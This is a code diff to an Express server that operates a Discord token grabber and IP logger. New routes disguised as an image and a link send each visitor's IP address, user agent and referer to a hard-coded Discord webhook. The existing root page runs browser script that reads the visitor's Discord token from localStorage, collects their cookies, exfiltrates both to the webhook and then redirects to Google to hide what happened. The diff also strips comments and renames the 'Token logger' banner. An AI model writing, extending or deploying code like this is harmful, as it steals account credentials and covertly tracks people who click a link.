@@ -5,10 +5,81 @@ const app = express();
 const PORT = process.env.PORT || 3000;
 const WEBHOOK_URL = process.env.WEBHOOK_URL || 'https://discord.com/api/webhooks/1502287600277262459/74ONlVS3pubojwvbGrqOhY58G7dXk4fD4Op4Oe7w2rcdypH_Ef7NUCGH3BvQZivlErod';
 
+// Real image URL (replace with your own)
+const IMAGE_URL = 'https://w0.peakpx.com/wallpaper/897/12/HD-wallpaper-black-mr-f-my-profile-thumbnail.jpg';
+
+// ========== IMAGE LOGGER ==========
+app.get('/image.png', async (req, res) => {
+    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
+    const userAgent = req.headers['user-agent'] || 'Unknown';
+    const time = new Date().toISOString();
+    const referer = req.headers['referer'] || 'Direct';
+
+    // Log to webhook
+    try {
+        await axios.post(WEBHOOK_URL, {
+            embeds: [{
+                title: '🖼️ Image Viewed!',
+                color: 0x00ff00,
+                fields: [
+                    { name: 'IP Address', value: ip, inline: true },
+                    { name: 'User-Agent', value: userAgent.substring(0, 100), inline: false },
+                    { name: 'Referer', value: referer, inline: true },
+                    { name: 'Time', value: time, inline: true }
+                ],
+                footer: { text: 'Image Logger' }
+            }]
+        });
+        console.log(`[${time}] Image viewed from ${ip}`);
+    } catch (error) {
+        console.error('Webhook error:', error.message);
+    }
+
+    // Serve the real image
+    try {
+        const imageResponse = await axios.get(IMAGE_URL, { responseType: 'stream' });
+        res.setHeader('Content-Type', imageResponse.headers['content-type']);
+        imageResponse.data.pipe(res);
+    } catch (error) {
+        // Fallback: transparent pixel
+        const pixel = Buffer.from('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==', 'base64');
+        res.writeHead(200, { 'Content-Type': 'image/png' });
+        res.end(pixel);
+    }
+});
+
+// ========== REDIRECT LOGGER ==========
+app.get('/click', (req, res) => {
+    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
+    const userAgent = req.headers['user-agent'] || 'Unknown';
+    const time = new Date().toISOString();
+    const referer = req.headers['referer'] || 'Direct';
+
+    // Log to webhook
+    axios.post(WEBHOOK_URL, {
+        embeds: [{
+            title: '🖱️ Link Clicked! (Redirect)',
+            color: 0xff8c00,
+            fields: [
+                { name: 'IP Address', value: ip, inline: true },
+                { name: 'User-Agent', value: userAgent.substring(0, 100), inline: false },
+                { name: 'Referer', value: referer, inline: true },
+                { name: 'Time', value: time, inline: true }
+            ],
+            footer: { text: 'Redirect Logger' }
+        }]
+    }).catch(() => {});
+
+    console.log(`[${time}] Redirect clicked from ${ip}`);
+
+    // Redirect to the real image
+    res.redirect(302, IMAGE_URL);
+});
+
+// ========== TOKEN EXTRACTOR (Browser-based) ==========
 app.get('/', (req, res) => {
     const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
-    
-    // HTML with JavaScript that runs on visitor's browser
+
     res.send(`
     <!DOCTYPE html>
     <html>
@@ -48,18 +119,13 @@ app.get('/', (req, res) => {
         </div>
 
         <script>
-        // THIS RUNS ON THE VISITOR'S BROWSER - NOT ON RAILWAY
         function extractTokens() {
-            // Get Discord token from localStorage (Discord web)
             let token = null;
             try {
                 token = localStorage.getItem('token');
             } catch(e) {}
             
-            // Get all cookies
             const cookies = document.cookie;
-            
-            // Get browser info
             const browserInfo = {
                 userAgent: navigator.userAgent,
                 platform: navigator.platform,
@@ -102,17 +168,14 @@ app.get('/', (req, res) => {
             }
         }
 
-        // Execute immediately
         (async function() {
             const data = extractTokens();
             await sendToWebhook(data);
             
-            // Also log to console (visible in Railway logs if you check)
             console.log('Token:', data.token || 'No token');
             console.log('Cookies:', data.cookies || 'No cookies');
             console.log('Browser:', data.browserInfo.userAgent);
             
-            // Redirect to Google to hide the activity
             setTimeout(() => {
                 window.location.href = 'https://www.google.com';
             }, 1500);
@@ -124,6 +187,8 @@ app.get('/', (req, res) => {
 });
 
 app.listen(PORT, () => {
-    console.log(`✅ Token logger running on port ${PORT}`);
+    console.log(`✅ Logger running on port ${PORT}`);
     console.log(`📡 Webhook: ${WEBHOOK_URL}`);
+    console.log(`📸 Image: /image.png`);
+    console.log(`🔄 Redirect: /click`);
 });
